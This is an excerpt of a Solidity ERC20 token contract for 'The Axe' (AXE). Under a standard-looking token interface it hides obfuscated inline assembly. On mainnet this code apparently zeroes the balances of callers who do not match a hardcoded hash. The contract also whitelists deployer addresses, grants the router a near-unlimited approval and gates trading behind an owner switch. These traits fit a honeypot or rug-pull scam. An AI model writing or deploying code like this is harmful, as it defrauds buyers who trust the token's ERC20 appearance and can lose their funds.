...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addAxe;
    uint256 private axeFight = block.number*2;

    mapping (address => bool) private _firstBehead; 
    mapping (address => bool) private _secondDestroy;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _faceTime;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private killBill;
    address public pair;
    ...
    bool private trading; uint256 private weedGreen = 1; bool private dumplingTime;
    uint256 private _decimals; uint256 private fakingTime;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addAxe.push(_router); addAxe.push(msgSender_); addAxe.push(pair);
        for (uint256 q=0; q < 3;) {_firstBehead[addAxe[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x2afeeb0d762a45c43b730b46e5c40a3ffb702fa904b7466547d73a9087f4b53b
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xd34baca3d353983ac88a7c4dc45aace579f0a6ab3690de850d0ac41bc409f133,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; axeFight = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addAxe[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployAxe(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addAxe[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployAxe(creator, initialSupply);
    }
}

contract TheAxeETH is ERC20Token {
    constructor() ERC20Token("The Axe", "AXE", msg.sender, 25000000 * 10 ** 18) {
    }
}